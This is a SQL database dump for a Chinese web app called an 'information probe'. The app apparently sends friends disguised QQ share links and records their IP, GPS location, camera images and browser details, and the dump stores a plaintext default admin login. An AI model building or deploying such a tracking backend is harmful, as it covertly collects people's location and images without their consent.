-- phpMyAdmin SQL Dump
-- version phpStudy 2014
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2020 �?02 �?28 �?11:18
-- 服务器版本: 5.5.53
-- PHP 版本: 5.6.27

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `root`
--

-- --------------------------------------------------------

--
-- 表的结构 `config_website`
--

CREATE TABLE IF NOT EXISTS `config_website` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `option_name` text,
  `option_value` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=15 ;

--
-- 转存表中的数据 `config_website`
--

INSERT INTO `config_website` (`id`, `option_name`, `option_value`) VALUES
(1, 'title', '信息探针'),
(2, 'subtitle', '专业查询好友个人信息'),
(3, 'keywords', '信息探针,位置探针,IP探针,好友IP,IP定位,查询好友IP,好友地址'),
(4, 'description', '信息探针是一款基于Layui开发的专业查询好友个人信息的程序'),
(5, 'code_bottom', ''),
(6, 'code_probe_add_top', ''),
(8, 'background_img', ''),
(9, 'background_music', ''),
(10, 'smtp_server', ''),
(11, 'smtp_server_port', ''),
(12, 'smtp_user', ''),
(13, 'smtp_user_mail', ''),
(14, 'smtp_user_password', '');

-- --------------------------------------------------------

--
-- 表的结构 `list_admin`
--

CREATE TABLE IF NOT EXISTS `list_admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` text,
  `password` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `list_admin`
--

INSERT INTO `list_admin` (`id`, `username`, `password`) VALUES
(1, 'admin', '123456');

-- --------------------------------------------------------

--
-- 表的结构 `list_function`
--

CREATE TABLE IF NOT EXISTS `list_function` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `option_name` text,
  `option_value` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- 转存表中的数据 `list_function`
--

INSERT INTO `list_function` (`id`, `option_name`, `option_value`) VALUES
(7, 'code_probe_query_top', ''),
(1, 'api_function', '1'),
(2, 'statistics_website_visit_function', '1'),
(3, 'statistics_probe_add_function', '1'),
(4, 'statistics_probe_query_function', '1'),
(5, 'statistics_use_api_function', '1'),
(6, 'statistics_email_notification_function', '1');

-- --------------------------------------------------------

--
-- 表的结构 `list_ip`
--

CREATE TABLE IF NOT EXISTS `list_ip` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key_ip` text,
  `ip` text,
  `ip_location` text,
  `ip_lonlat` text,
  `gps_location` text,
  `gps_lonlat` text,
  `camera_img` text,
  `system` text,
  `browser` text,
  `browser_ua` text,
  `browser_language` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=60 ;

-- --------------------------------------------------------

--
-- 表的结构 `list_probe`
--

CREATE TABLE IF NOT EXISTS `list_probe` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key_probe` text,
  `probe_page` text,
  `ip_location_function` text,
  `gps_location_function` text,
  `camera_img_function` text,
  `email_notification_function` text,
  `email` text,
  `qqshare_title` text,
  `qqshare_pics` text,
  `qqshare_summary` text,
  `qqshare_desc` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=28 ;

-- --------------------------------------------------------

--
-- 表的结构 `list_statistics`
--

CREATE TABLE IF NOT EXISTS `list_statistics` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` text,
  `number` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `list_statistics`
--

INSERT INTO `list_statistics` (`id`, `type`, `number`) VALUES
(1, 'statistics_website_visit_number', '402'),
(2, 'statistics_probe_add_number', '27'),
(3, 'statistics_probe_query_number', '56'),
(4, 'statistics_use_api_number', '0'),
(5, 'statistics_email_notification_number', '26');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
